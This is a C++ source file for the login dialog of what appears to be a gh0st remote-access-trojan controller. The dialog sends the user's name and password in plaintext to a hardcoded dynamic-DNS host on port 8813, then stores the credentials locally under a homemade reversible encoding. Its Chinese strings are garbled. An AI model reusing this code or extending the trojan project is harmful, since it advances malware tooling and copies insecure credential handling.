// LOGIN.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "LOGIN.h"
#include "EnDeCode.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// LOGIN dialog

LOGIN::LOGIN(CWnd* pParent /*=NULL*/)
	: CDialog(LOGIN::IDD, pParent)
{
	//{{AFX_DATA_INIT(LOGIN)
	m_username = _T("");
	m_userpass = _T("");
	m_baocun = FALSE;
	m_onlinepass = _T("");
	//}}AFX_DATA_INIT
}


void LOGIN::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(LOGIN)
	DDX_Text(pDX, IDC_username, m_username);
	DDX_Text(pDX, IDC_userpass, m_userpass);
	DDX_Check(pDX, IDC_CHECK1, m_baocun);
	DDX_Text(pDX, IDC_onlinepass, m_onlinepass);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(LOGIN, CDialog)
	//{{AFX_MSG_MAP(LOGIN)
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	ON_BN_CLICKED(IDC_LOGIN, OnLogin)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// LOGIN message handlers

void LOGIN::OnLogin() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	if ( m_username.GetLength() == 0 || m_userpass.GetLength() == 0 )
	{
		AfxMessageBox(_T("����д�û���������."));
		return;
	}
	//////////////////////////////////////////////////////////////////////////////////////////////////
	DWORD recvsize = 0;
	SOCKET sockInt;
	struct sockaddr_in serverAddr;
	//struct hostent *hp;
	WORD sockVersion;
    WSADATA wsaData;
    sockVersion = MAKEWORD(2,2);
    WSAStartup(sockVersion, &wsaData);
	//����SOCK
	sockInt = socket(AF_INET, SOCK_STREAM, 0);
	if(sockInt == INVALID_SOCKET)
	{
		AfxMessageBox(_T("socket error!\n"));
		WSACleanup();
		return;
	}
	
	//��ȡ������IP�Ͷ˿�
	serverAddr.sin_family = AF_INET;

	char tgtIP[30] = {0};
	struct hostent *hp = NULL;
	if ((hp = gethostbyname("fkjpgt.3322.org")) != NULL)
	{
		in_addr in;
		memcpy(&in, hp->h_addr, hp->h_length);
		lstrcpyA(tgtIP,inet_ntoa(in));
	}

	serverAddr.sin_addr.s_addr = inet_addr(tgtIP);
	serverAddr.sin_port = htons(8813);

	//���ӷ���
	if(connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
		AfxMessageBox(_T("���ӷ�����ʧ��."));
		WSACleanup();
		return;
	}
	char USERIMFOR[256] = {0}, buff[256] = {0};
	wsprintfA( USERIMFOR, "Login:%s@%s", m_username, m_userpass );
	if( send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR )
	{
		AfxMessageBox(_T("���ӷ�����ʧ��."));
		WSACleanup();
		return;
	}
	Sleep(50);
	int Ret = recv( sockInt, buff, sizeof(buff), NULL );
	if ( Ret == 0 || Ret == SOCKET_ERROR )
	{
		AfxMessageBox(_T("�˺Ŵ���"));
		closesocket(sockInt);
		WSACleanup();
		return;
	}

	if ( lstrcmpiA( buff, "Logined" ) == 0 )//ͨ����֤
	{
		dLogin = GetTickCount();
		closesocket(sockInt);
		WSACleanup();
		if ( m_baocun )
		{
            USES_CONVERSION;
            m_inifile.SetString( _T("USER"), _T("username"), m_username );
			m_inifile.SetString( _T("USER"), _T("userpass"), A2W(EnDeCode::Encode(EnDeCode::encrypt(W2A(m_userpass.GetBuffer(0))))) );
			m_inifile.SetString( _T("Settings"), _T("OnLinePass"), A2W(EnDeCode::Encode(EnDeCode::encrypt(W2A(m_onlinepass.GetBuffer(0)))) ));
		}
		OnCancel();
	}
}

void LOGIN::OnExit() 
{
	// TODO: Add your control notification handler code here
	ExitProcess(0);
}

BOOL LOGIN::OnInitDialog() 
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	SetDlgItemText( IDC_username, m_inifile.GetString( "USER", "username", "" ) );
	CStringA pass = m_inifile.GetString( "USER", "userpass", "" );
    USES_CONVERSION;
	if ( pass.GetLength() != 0 )
	{
		SetDlgItemText( IDC_userpass, A2W(EnDeCode::decrypt(EnDeCode::Decode(pass.GetBuffer(0)))));
	}
	pass = m_inifile.GetString( "Settings", "OnLinePass", "" );
	if ( pass.GetLength() != 0 )
	{
        SetDlgItemText(IDC_onlinepass, A2W(EnDeCode::decrypt(EnDeCode::Decode(pass.GetBuffer(0)))));
	}
	UpdateData();
	m_baocun = TRUE;
	UpdateData(FALSE);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
